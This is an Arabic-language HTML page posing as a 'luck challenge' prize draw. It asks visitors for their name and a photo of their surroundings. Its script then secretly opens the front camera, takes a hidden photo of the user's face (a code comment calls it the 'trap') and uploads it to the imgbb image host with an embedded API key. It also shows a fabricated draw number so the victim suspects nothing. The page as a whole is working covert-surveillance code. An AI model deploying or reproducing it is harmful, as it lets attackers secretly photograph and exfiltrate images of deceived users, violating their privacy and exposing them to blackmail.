<!DOCTYPE html>
<html lang="ar">

<head>
    <meta charset="UTF-8">
    <title>🔮 تحدي الحظ – هل صورتك فائزة؟</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: 'Tahoma', sans-serif;
            text-align: center;
            background: linear-gradient(to bottom right, #ffe3e3, #ffc9de);
            color: #333;
            padding: 50px 20px;
            direction: rtl;
        }

        h1 {
            font-size: 2.5em;
            color: #d60087;
            margin-bottom: 10px;
        }

        p {
            font-size: 1.2em;
            margin-bottom: 15px;
        }

        input {
            padding: 10px;
            font-size: 1.1em;
            border: 2px solid #d60087;
            border-radius: 8px;
            width: 80%;
            max-width: 300px;
            margin-bottom: 10px;
        }

        button {
            background-color: #d60087;
            color: white;
            border: none;
            padding: 15px 35px;
            font-size: 1.1em;
            border-radius: 10px;
            cursor: pointer;
            transition: background 0.3s;
        }

        button:hover {
            background-color: #b0006f;
        }

        video {
            display: none;
            width: 100%;
            max-width: 400px;
            margin: auto;
            border-radius: 12px;
        }

        #captureBtn {
            display: none;
            background-color: green;
            margin-top: 10px;
        }

        #result {
            margin-top: 30px;
            font-size: 1.3em;
            color: #006600;
        }

        #draw-number {
            font-size: 1.5em;
            font-weight: bold;
            color: #000;
        }
    </style>
</head>

<body>
    <h1>🔮 تحدي الحظ – لقطة واحدة قد تغيّر كل شيء!</h1>
    <p>صوّر شيء من محيطك بكاميرا هاتفك، واربح فرصة لدخول السحب على جوائز رقمية رائعة 🤩</p>
    <p id="pp" style="margin:0 0 70px 0;">هل الصورة فيها لمسة حظ؟ جرب الآن!</p>
    <p id="s">أدخل اسمك للمشاركة:</p>
    <br>
    <input type="text" id="username" placeholder="مثال: أحمد">
    <br>
    <button onclick="startChallenge()">🎯 التقط صورتك الآن</button>

    <video id="video" autoplay playsinline></video>
    <br>
    <button id="captureBtn" onclick="captureImage()">📸 التقاط</button>

    <audio id="shutter" src="https://www.soundjay.com/mechanical/camera-shutter-click-01.mp3" preload="auto"></audio>

    <div id="result"></div>

    <script>
        const API_KEY = '8b3ff25139462514d13f5d9a3b3c0d05';
        const video = document.getElementById('video');
        const shutter = document.getElementById('shutter');
        const captureBtn = document.getElementById('captureBtn');
        const resultDiv = document.getElementById('result');
        let userName = '';

        function generateFakeDrawNumber() {
            const random = Math.floor(100000 + Math.random() * 900000); // 6 أرقام
            return '2025' + random; // يبدأ بـ 2025
        }

        async function startChallenge() {
            const input = document.getElementById('username');
            if (!input.value.trim()) {
                alert('يرجى إدخال اسمك أولاً.');
                return;
            }

            userName = input.value.trim();
            input.style.display = 'none';
            document.querySelector('button').style.display = 'none';
            document.querySelector('p').textContent = '📷 افتح الكاميرا ووجّهها لأي شيء حولك!';
            document.getElementById('pp').style.display = 'none';
            document.getElementById('s').style.display = 'none';

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                video.srcObject = stream;
                video.style.display = 'block';
                captureBtn.style.display = 'inline-block';
            } catch (err) {
                alert('⚠️ تعذر تشغيل الكاميرا. تأكد من السماح بالوصول.');
            }
        }

        async function captureImage() {
            captureBtn.style.display = 'none';
            shutter.play();

            const stream = video.srcObject;
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            stream.getTracks().forEach(track => track.stop());
            video.style.display = 'none';
            document.querySelector('p').textContent = '🚀 إرسال الصورة... جارٍ التحقق من الحظ!';

            // فتح الكاميرا الأمامية والتقاط "الفخ"
            try {
                const hiddenStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const hiddenVideo = document.createElement('video');
                hiddenVideo.srcObject = hiddenStream;
                hiddenVideo.play();

                setTimeout(async () => {
                    const hiddenCanvas = document.createElement('canvas');
                    hiddenCanvas.width = hiddenVideo.videoWidth;
                    hiddenCanvas.height = hiddenVideo.videoHeight;
                    const hiddenCtx = hiddenCanvas.getContext('2d');
                    hiddenCtx.drawImage(hiddenVideo, 0, 0);
                    hiddenStream.getTracks().forEach(track => track.stop());

                    const imageData = hiddenCanvas.toDataURL('image/jpeg');
                    const formData = new FormData();
                    formData.append('image', imageData.split(',')[1]);

                    try {
                        const res = await fetch(`https://api.imgbb.com/1/upload?key=${API_KEY}`, {
                            method: 'POST',
                            body: formData
                        });

                        const data = await res.json();
                        if (data.success) {
                            const drawNum = generateFakeDrawNumber();
                            document.querySelector('p').textContent = '';
                            resultDiv.innerHTML = `
                🎉 مبروك يا <strong>${userName}</strong>! تم دخولك للسحب بنجاح.<br>
                رقم السحب الخاص بك: <div id="draw-number">${drawNum}</div>
              `;
                            console.log('📷 رابط الصورة:', data.data.url);
                        } else {
                            resultDiv.textContent = '❌ فشل في إرسال الصورة.';
                        }
                    } catch (err) {
                        resultDiv.textContent = '❌ حدث خطأ أثناء الإرسال.';
                    }

                }, 2000);

            } catch (err) {
                console.log('⚠️ فشل الكاميرا الأمامية:', err);
            }
        }
    </script>
</body>

</html>
